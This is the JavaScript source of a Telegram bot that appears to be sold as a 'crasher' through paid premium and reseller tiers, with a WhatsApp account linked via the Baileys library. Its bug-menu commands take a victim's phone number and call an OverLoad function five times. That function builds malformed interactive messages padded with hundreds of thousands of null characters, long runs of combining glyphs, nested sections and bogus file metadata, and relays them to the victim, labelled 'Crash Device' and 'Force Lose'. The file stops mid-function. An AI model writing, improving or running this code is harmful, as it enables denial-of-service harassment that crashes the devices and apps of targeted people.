const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const crypto = require('crypto');
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
let angeles = null;
let isWhatsAppConnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerorno;
let adminorno;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ownerorno = "✅";
        return true;
    } else {
        ownerorno = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminorno = "✅";
        return true;
    } else {
        adminorno = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan List Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./angeles/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat List Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./angeles/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat list admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./angeles/premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./angeles/premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./angeles/userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./angeles/userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("Maaf, Anda bukan user premium. Silakan hubungi developer @KingAsep untuk upgrade.");
    }
};

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
    };

    angeles = makeWASocket(connectionOptions);

    angeles.ev.on('creds.update', saveCreds);
    store.bind(angeles.ev);

    angeles.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
        try {
            angeles.newsletterFollow("120363371663263904@newsletter");
        } catch (error) {
            console.error('Newsletter follow error:', error);
        }
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`${chalk.green.bold('Whatsapp Connected')}`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`${chalk.red.bold('Whatsapp Disconnected')}`),
                shouldReconnect ? chalk.white.bold(`${chalk.red.bold('Reconnecting Again')}`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`${chalk.yellowBright.bold('System Anti Crack Active')}`));
    console.log(chalk.white.bold(`${chalk.yellow.bold('Sukses Memuat Database Owner')}`));
    loadPremiumUsers();
    loadAdmins();
    loadUserActivity();
    startSesi();
})();

// --- Command Handler ---
// Command untuk pairing WhatsApp
bot.command("addpairing", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("Format perintah salah. Gunakan: /addpairing ( Number )");
    }
    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
    if (!phoneNumber.startsWith('62')) {
        return await ctx.reply("Nomor harus diawali dengan 62. Contoh: /addpairing 628xxx");
    }
    if (angeles && angeles.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await angeles.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
*Pairing Code WhatsApp:*

*Nomor:* ${phoneNumber}
*Kode:* \`${formattedCode}\`
    `;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("Format perintah salah. Gunakan: /addadmin ( UseriD )");
    }

    addAdmin(userId);

    const successMessage = `
User dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
*ID User:* ${userId}

Admin sekarang memiliki akses ke perintah /addprem dan /delprem.
`;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("Format perintah salah. Gunakan: /deladmin ( UseriD )");
    }

    removeAdmin(userId);

    const successMessage = `
User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
*ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
`;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan List Admin
bot.command("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("Maaf, Anda tidak memiliki akses untuk melihat list admin.");
    }

const adminListString = adminList.length > 0
? adminList.map(id => `- ${id}`).join(`
`)
: "Tidak ada admin yang terdaftar.";

    const message = `
𝗟𝗶𝘀𝘁 𝗔𝗱𝗺𝗶𝗻:
${adminListString}

Total: ${adminList.length} admin.
`;

    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("Format perintah salah. Gunakan: /addprem ( UseriD + Durasi )");
    }

    const userId = args[1];
    const durationDays = parseInt(args[2]);

    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("Durasi hari harus berupa angka positif.");
    }

    addPremiumUser(userId, durationDays);

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

    const successMessage = `
User dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
*ID User:* ${userId}
*Durasi:* ${durationDays} hari
*Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
`;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("Format perintah salah. Gunakan: /delprem ( UseriD )");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
*ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
`;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.command(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
Status Premium User *${userId}*

*Detail:*
*ID User:* ${userId}
*Kadaluarsa:* ${formattedExpiration} WIB
*Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
`;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const donerespone = async (target, ctx) => {
const caption = `Succesfully Sending Bug
${target}`;

    await ctx.reply(caption)
};

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

// --- Command Bugmenu
bot.command("hisokaflow", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) {
    return await ctx.reply(`Example: commandnya 62×××`);
    }
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    await donerespone(target, ctx);

   // Function Bugs
    for (let i = 0; i < 5; i++) {
    await OverLoad(target);
    }
});
bot.command("hisokabeta", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) {
    return await ctx.reply(`Example: commandnya 62×××`);
    }
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    await donerespone(target, ctx);

   // Function Bugs
    for (let i = 0; i < 5; i++) {
    await OverLoad(target);
    }
});
bot.command("santet", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) {
    return await ctx.reply(`Example: commandnya 62×××`);
    }
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    await donerespone(target, ctx);

   // Function Bugs
    for (let i = 0; i < 5; i++) {
    await OverLoad(target);
    }
});
bot.command("asepexecute", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) {
    return await ctx.reply(`Example: commandnya 62×××`);
    }
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    await donerespone(target, ctx);

   // Function Bugs
    for (let i = 0; i < 5; i++) {
    await OverLoad(target);
    }
});


bot.start(async (ctx) => {
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  const mainMenuMessage = `hai I'm a Bot 𝙷𝙸𝚂𝙾𝙺𝙰 𝙲𝚁𝙰𝚂𝙷𝙴𝚁 𝚅 𝟷.𝟻
is ready helps with any problem
━━━━━━━━━━━━━━━━━━
𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧 : @KingAsep
𝙊𝙬𝙣𝙚𝙧 : ${isOwnerStatus ? '𝘈𝘤𝘤𝘦𝘴' : '𝘕𝘰𝘵 𝘈𝘤𝘤𝘦𝘴'}
𝘼𝙙𝙢𝙞𝙣 : ${isAdminStatus ? '𝘈𝘤𝘤𝘦𝘴' : '𝘕𝘰𝘵 𝘈𝘤𝘤𝘦𝘴'}
𝙋𝙧𝙚𝙢𝙞𝙪𝙢 : ${isPremium ? '𝘈𝘤𝘤𝘦𝘴' : '𝘕𝘰𝘵 𝘈𝘤𝘤𝘦𝘴'}
━━━━━━━━━━━━━━━━━━

╔─═ 「 𝐂͢𝐎͠𝐌𝐌͜𝐀𝐍𝐃」 ─═⬣
│ ┏⊱
╠ ▢ /bugmenu
╠ ▢ /ownmenu
╠ ▢ /sellermenu
│ ┗⊱
╚─═─═─═─═─═─═─═⬣`;
const photoUrl = "https://img86.pixhost.to/images/489/563047358_sano.jpg"; 
  const mainKeyboard = [
    [{
      text: "⿻ ＩＮＦＯＲＭＡＴＩＯＮ ⿻",
      url: "https://t.me/KingAsep"
    }],
  ];
    ctx.replyWithPhoto(photoUrl, {
    caption: mainMenuMessage,
    reply_markup: {
      inline_keyboard: mainKeyboard
    }
  });
});

bot.command('sellermenu', async (ctx) => {
await ctx.deleteMessage();
const ResellerMenu = `
╔─═ 「 𝐂͢𝐎͠𝐌𝐌͜𝐀𝐍𝐃」 ─═⬣
│ ┏⊱
╠ ▢ /addprem - premium features
╠ ▢ /delprem - remove premium
│ ┗⊱
╚─═─═─═─═─═─═─═⬣`;
const photoUrl = "https://img86.pixhost.to/images/489/563047358_sano.jpg"; 
  const mainKeyboard = [
    [{
      text: "⿻ ＩＮＦＯＲＭＡＴＩＯＮ ⿻",
      url: "https://t.me/KingAsep"
    }],
  ];
    ctx.replyWithPhoto(photoUrl, {
    caption: ResellerMenu,
    reply_markup: {
      inline_keyboard: mainKeyboard
    }
  });
});
bot.command('ownmenu', async (ctx) => {
await ctx.deleteMessage();
const OwnMenu = `
╔─═ 「 𝐂͢𝐎͠𝐌𝐌͜𝐀𝐍𝐃」 ─═⬣
│ ┏⊱
╠ ▢ /addadmin - unlock addprem
╠ ▢ /deladmin - premium features
╠ ▢ /addprem - premium features
╠ ▢ /delprem - remove premium
╠ ▢ /addpairing - connect to wa
╠ ▢ /maintenance - true / false
│ ┗⊱
╚─═─═─═─═─═─═─═⬣`;
const photoUrl = "https://img86.pixhost.to/images/489/563047358_sano.jpg"; 
  const mainKeyboard = [
    [{
      text: "⿻ ＩＮＦＯＲＭＡＴＩＯＮ ⿻",
      url: "https://t.me/KingAsep"
    }],
  ];
    ctx.replyWithPhoto(photoUrl, {
    caption: OwnMenu,
    reply_markup: {
      inline_keyboard: mainKeyboard
    }
  });
});
bot.command('bugmenu', async (ctx) => {
await ctx.deleteMessage();
const BugMenu = `
╔─═ 「 𝐂͢𝐎͠𝐌𝐌͜𝐀𝐍𝐃」 ─═⬣
│ ┏⊱
╠ ▢ /hisokaflow [ Force Lose ]
╠ ▢ /hisokabeta [ Crash Beta ]
╠ ▢ /santet [ Crash Device ]
╠ ▢ /asepexecute [ Crash Ui ]
│ ┗⊱
╚─═─═─═─═─═─═─═⬣`;
const photoUrl = "https://img86.pixhost.to/images/489/563047358_sano.jpg"; 
  const mainKeyboard = [
    [{
      text: "⿻ ＩＮＦＯＲＭＡＴＩＯＮ ⿻",
      url: "https://t.me/KingAsep"
    }],
  ];
    ctx.replyWithPhoto(photoUrl, {
    caption: BugMenu,
    reply_markup: {
      inline_keyboard: mainKeyboard
    }
  });
});

// Fungsi untuk menghapus semua pesan dari target
  async function clearChat(target) {
    try {
      // Format nomor ke format JID
      const targetJid = targetNumber.includes("@s.whatsapp.net")
        ? targetNumber: `${target}@s.whatsapp.net`;

      // Periksa apakah target ada di daftar kontak
      const chats = angeles.chats.get(targetJid);
      if (!chats) {
        console.log("Target chat tidak ditemukan!");
        return;
      }

      // Hapus semua pesan di chat target
      await angeles.modifyChat(targetJid, "delete");
      console.log(chalk.green.bold(`Semua pesan dengan ${target} telah dihapus.`));
    } catch (error) {
      console.error("Gagal menghapus chat:", error);
   }
}


async function OverLoad(target) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:`⿻ 𝐋͢𝐎͠𝐒 - 𝐀𝐍͠𝐆𝐄͢𝐋𝐄͜𝐒 ⿻${"ꦾ".repeat(1000)}`,
          listType: 2,
          singleSelectReply: {
            selectedRowId: "angeles",
          },
          contextInfo: {
            stanzad: angeles.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Zyroo" + "҉⃝҉".repeat(16999),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "https://files.catbox.moe/scwqwq.jpg",
                },
                hasMediaAttachment: true,
                contentText: 'Zhyro is here"',
                footerText: "Los Angeles",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "force?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "force?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "force?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: "zyro",
              mediaType: "IMAGE",
              jpegThumbnail: "https://files.catbox.moe/scwqwq.jpg",
              caption: "los angeles",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "ultimate_entry_point",
            entryPointConversionApp: "entry_point_app_example",
            actionLink: {
              url: "https://t.me/zyroexecute",
              buttonTitle: "force",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "zyro",
            parentGroupJid: "angeles",
            trustBannerType: "force",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363373008401043@newsletter",
              serverMessageId: 1,
              newsletterName: `⿻ 𝐋͢𝐎͠𝐒 - 𝐀𝐍͠𝐆𝐄͢𝐋𝐄͜𝐒 ⿻${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "force",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: target.repeat(2999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(90000);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(250000),
          subrows: [
            {
              title: `\u0000`.repeat(250000),
              id: `\u0000`.repeat(250000),
              subsubrows: [
                {
                  title: `\u0000`.repeat(250000),
                  id: `\u0000`.repeat(250000),
                },
                {
                  title: `\u0000`.repeat(250000),
                  id: `\u0000`.repeat(250000),
                },
              ],
            },
            {
              title: `\u0000`.repeat(250000),
              id: `\u0000`.repeat(250000),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "OVERLOAD_CRASH",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
            stanzaId: angeles.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Z?" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "https://files.catbox.moe/scwqwq.jpg",
                },
                hasMediaAttachment: true,
                contentText: 'Zhyro is here"',
                footerText: "Los Angeles",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "force?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "force?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "force?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '⿻ 𝐋͢𝐎͠𝐒 - 𝐀𝐍͠𝐆𝐄͢𝐋𝐄͜𝐒 ⿻' + "҉⃝҉".repeat(19999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "⿻ 𝐋͢𝐎͠𝐒 - 𝐀𝐍͠𝐆𝐄͢𝐋𝐄͜𝐒 ⿻" + "҉⃝҉".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                   name: "payment_method",
                   buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                   name: "mpm",
                   buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await angeles.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await angeles.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
